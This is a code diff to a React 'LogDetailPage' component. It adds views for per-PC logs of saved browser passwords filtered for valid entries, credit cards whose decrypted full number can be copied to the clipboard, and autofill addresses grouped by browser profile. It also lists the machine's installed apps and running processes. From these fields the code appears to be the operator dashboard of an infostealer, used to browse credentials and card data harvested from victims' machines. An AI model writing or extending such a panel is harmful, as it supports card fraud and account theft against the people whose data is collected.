@@ -946,14 +946,29 @@ const LogDetailPage = () => {
             return <Typography sx={{ p: 2, color: '#94a3b8' }}>No saved passwords found.</Typography>;
         }
 
+        // Filter out passwords with "N/A" or empty values
+        const validPasswords = passwords.filter(pwd => {
+            const origin = (pwd.origin || '').trim().toLowerCase();
+            const username = (pwd.username || '').trim().toLowerCase();
+            const password = (pwd.password || '').trim().toLowerCase();
+            
+            return origin && origin !== 'n/a' && origin !== '' &&
+                   username && username !== 'n/a' && username !== '' &&
+                   password && password !== 'n/a' && password !== '';
+        });
+
+        if (validPasswords.length === 0) {
+            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No valid saved passwords found.</Typography>;
+        }
+
         const filteredPasswords = debouncedSearchQuery
-            ? passwords.filter(pwd => {
+            ? validPasswords.filter(pwd => {
                 const queryLower = debouncedSearchQuery.toLowerCase();
                 return (pwd.origin && pwd.origin.toLowerCase().includes(queryLower)) ||
                        (pwd.username && pwd.username.toLowerCase().includes(queryLower)) ||
                        (pwd.password && pwd.password.toLowerCase().includes(queryLower));
             })
-            : passwords;
+            : validPasswords;
 
         if (filteredPasswords.length === 0 && debouncedSearchQuery) {
             return <Typography sx={{ p: 2, color: '#94a3b8' }}>No passwords match your search query.</Typography>;
@@ -1013,6 +1028,218 @@ const LogDetailPage = () => {
                         </TableBody>
                     </Table>
                 </TableContainer>
+            </Box>
+        );
+    };
+
+    const renderCreditCards = (creditCards) => {
+        if (!creditCards || creditCards.length === 0) {
+            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No credit cards found.</Typography>;
+        }
+
+        // Filter credit cards based on search query
+        const filteredCards = debouncedSearchQuery 
+            ? creditCards.filter(card => 
+                matchesSearch(card.nameOnCard) || 
+                matchesSearch(card.cardNumber) || 
+                matchesSearch(card.browser)
+            )
+            : creditCards;
+
+        if (filteredCards.length === 0 && debouncedSearchQuery) {
+            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No credit cards match your search query.</Typography>;
+        }
+
+        const handleCopyCardNumber = (cardNumber) => {
+            navigator.clipboard.writeText(cardNumber).then(() => {
+                console.log('Card number copied to clipboard');
+            }).catch(err => {
+                console.error('Failed to copy card number:', err);
+            });
+        };
+
+        return (
+            <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
+                {filteredCards.map((card, index) => (
+                    <Paper 
+                        key={index}
+                        sx={{ 
+                            backgroundColor: '#252b3b', 
+                            border: '1px solid #334155', 
+                            borderRadius: '12px', 
+                            overflow: 'hidden', 
+                            p: 2,
+                            background: 'linear-gradient(135deg, #1a1f2e 0%, #252b3b 50%, #1e3a5f 100%)'
+                        }}
+                    >
+                        <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 2 }}>
+                            <Box>
+                                <Typography variant="h6" sx={{ color: '#f59e0b', fontWeight: 600, mb: 0.5 }}>
+                                    💳 {card.nameOnCard || 'Unknown Cardholder'}
+                                </Typography>
+                                <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
+                                    <Chip 
+                                        label={card.browser} 
+                                        size="small" 
+                                        sx={{ 
+                                            backgroundColor: '#1a1f2e',
+                                            color: '#4ade80',
+                                            border: '1px solid #334155'
+                                        }} 
+                                    />
+                                    <Chip 
+                                        label={card.profile || 'Default'} 
+                                        size="small" 
+                                        sx={{ 
+                                            backgroundColor: '#1a1f2e',
+                                            color: '#94a3b8',
+                                            border: '1px solid #334155'
+                                        }} 
+                                    />
+                                </Box>
+                            </Box>
+                            {card.encryptedNumber && (
+                                <Tooltip title="Copy full card number">
+                                    <IconButton 
+                                        onClick={() => handleCopyCardNumber(card.encryptedNumber)}
+                                        sx={{ 
+                                            color: '#f59e0b',
+                                            '&:hover': {
+                                                backgroundColor: 'rgba(245, 158, 11, 0.1)',
+                                            }
+                                        }}
+                                    >
+                                        <ContentCopyIcon />
+                                    </IconButton>
+                                </Tooltip>
+                            )}
+                        </Box>
+                        <TableContainer component={Paper} sx={{ backgroundColor: '#1a1f2e', border: '1px solid #334155', borderRadius: '8px' }}>
+                            <Table size="small">
+                                <TableBody>
+                                    <TableRow>
+                                        <TableCell sx={{ color: '#f59e0b', fontWeight: 600, width: '30%' }}>Card Number</TableCell>
+                                        <TableCell sx={{ color: '#e2e8f0', fontFamily: 'monospace', letterSpacing: '2px' }}>
+                                            {card.cardNumber || '**** **** **** ****'}
+                                        </TableCell>
+                                    </TableRow>
+                                    <TableRow>
+                                        <TableCell sx={{ color: '#f59e0b', fontWeight: 600 }}>Expiration</TableCell>
+                                        <TableCell sx={{ color: '#e2e8f0' }}>
+                                            {card.expirationMonth?.toString().padStart(2, '0') || '??'} / {card.expirationYear || '????'}
+                                        </TableCell>
+                                    </TableRow>
+                                    {card.billingAddress && (
+                                        <TableRow>
+                                            <TableCell sx={{ color: '#f59e0b', fontWeight: 600 }}>Billing Address</TableCell>
+                                            <TableCell sx={{ color: '#94a3b8' }}>{card.billingAddress}</TableCell>
+                                        </TableRow>
+                                    )}
+                                    {card.encryptedNumber && (
+                                        <TableRow>
+                                            <TableCell sx={{ color: '#f59e0b', fontWeight: 600 }}>Full Number</TableCell>
+                                            <TableCell sx={{ color: '#4ade80', fontFamily: 'monospace' }}>
+                                                Decrypted (click copy icon)
+                                            </TableCell>
+                                        </TableRow>
+                                    )}
+                                </TableBody>
+                            </Table>
+                        </TableContainer>
+                    </Paper>
+                ))}
+            </Box>
+        );
+    };
+
+    const renderAutofillAddresses = (addresses) => {
+        if (!addresses || addresses.length === 0) {
+            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No autofill addresses found.</Typography>;
+        }
+
+        // Filter addresses based on search query
+        const filteredAddresses = debouncedSearchQuery 
+            ? addresses.filter(addr => 
+                matchesSearch(addr.fullName) || 
+                matchesSearch(addr.streetAddress) || 
+                matchesSearch(addr.city) ||
+                matchesSearch(addr.state) ||
+                matchesSearch(addr.zipCode) ||
+                matchesSearch(addr.country) ||
+                matchesSearch(addr.phoneNumber) ||
+                matchesSearch(addr.email) ||
+                matchesSearch(addr.browser)
+            )
+            : addresses;
+
+        if (filteredAddresses.length === 0 && debouncedSearchQuery) {
+            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No addresses match your search query.</Typography>;
+        }
+
+        // Group addresses by browser/profile
+        const groupedAddresses = {};
+        filteredAddresses.forEach(addr => {
+            const key = `${addr.browser || 'Unknown'} - ${addr.profile || 'Default'}`;
+            if (!groupedAddresses[key]) {
+                groupedAddresses[key] = [];
+            }
+            groupedAddresses[key].push(addr);
+        });
+
+        return (
+            <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
+                {Object.entries(groupedAddresses).map(([browserProfile, addrs], groupIndex) => (
+                    <Paper 
+                        key={groupIndex}
+                        sx={{ 
+                            backgroundColor: '#252b3b', 
+                            border: '1px solid #334155', 
+                            borderRadius: '12px', 
+                            overflow: 'hidden', 
+                            p: 2 
+                        }}
+                    >
+                        <Typography variant="h6" sx={{ color: '#4ade80', fontWeight: 600, mb: 2 }}>
+                            📍 {browserProfile}
+                        </Typography>
+                        <TableContainer component={Paper} sx={{ backgroundColor: '#1a1f2e', border: '1px solid #334155', borderRadius: '8px' }}>
+                            <Table size="small">
+                                <TableHead>
+                                    <TableRow>
+                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Name</TableCell>
+                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Address</TableCell>
+                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>City</TableCell>
+                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>State</TableCell>
+                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>ZIP</TableCell>
+                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Country</TableCell>
+                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Phone</TableCell>
+                                        <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Email</TableCell>
+                                    </TableRow>
+                                </TableHead>
+                                <TableBody>
+                                    {addrs.map((addr, index) => (
+                                        <TableRow key={index} sx={{
+                                            '&:hover': {
+                                                backgroundColor: 'rgba(255, 255, 255, 0.03)',
+                                            }
+                                        }}>
+                                            <TableCell sx={{ color: '#e2e8f0' }}>{addr.fullName || '-'}</TableCell>
+                                            <TableCell sx={{ color: '#94a3b8', maxWidth: '200px', wordBreak: 'break-word' }}>
+                                                {addr.streetAddress || '-'}
+                                            </TableCell>
+                                            <TableCell sx={{ color: '#94a3b8' }}>{addr.city || '-'}</TableCell>
+                                            <TableCell sx={{ color: '#94a3b8' }}>{addr.state || '-'}</TableCell>
+                                            <TableCell sx={{ color: '#94a3b8' }}>{addr.zipCode || '-'}</TableCell>
+                                            <TableCell sx={{ color: '#94a3b8' }}>{addr.country || '-'}</TableCell>
+                                            <TableCell sx={{ color: '#94a3b8' }}>{addr.phoneNumber || '-'}</TableCell>
+                                            <TableCell sx={{ color: '#94a3b8' }}>{addr.email || '-'}</TableCell>
+                                        </TableRow>
+                                    ))}
+                                </TableBody>
+                            </Table>
+                        </TableContainer>
+                    </Paper>
+                ))}
             </Box>
         );
     };
@@ -1569,6 +1796,20 @@ const LogDetailPage = () => {
                 data={pcData.savedPasswords} 
                 renderFunction={renderSavedPasswords} 
             />
+            {pcData.creditCards && pcData.creditCards.length > 0 && (
+                <DataSection 
+                    title={`Credit Cards (${pcData.creditCards.length})`} 
+                    data={pcData.creditCards} 
+                    renderFunction={renderCreditCards} 
+                />
+            )}
+            {pcData.autofillAddresses && pcData.autofillAddresses.length > 0 && (
+                <DataSection 
+                    title={`Autofill Addresses (${pcData.autofillAddresses.length})`} 
+                    data={pcData.autofillAddresses} 
+                    renderFunction={renderAutofillAddresses} 
+                />
+            )}
             <DataSection title={`Installed Apps (${pcData.installedApps?.length || 0})`} data={pcData.installedApps} renderFunction={renderSimpleTable} />
             <DataSection title={`Running Processes (${pcData.runningProcesses?.length || 0})`} data={pcData.runningProcesses} renderFunction={renderProcessesTable} />
         </Box>
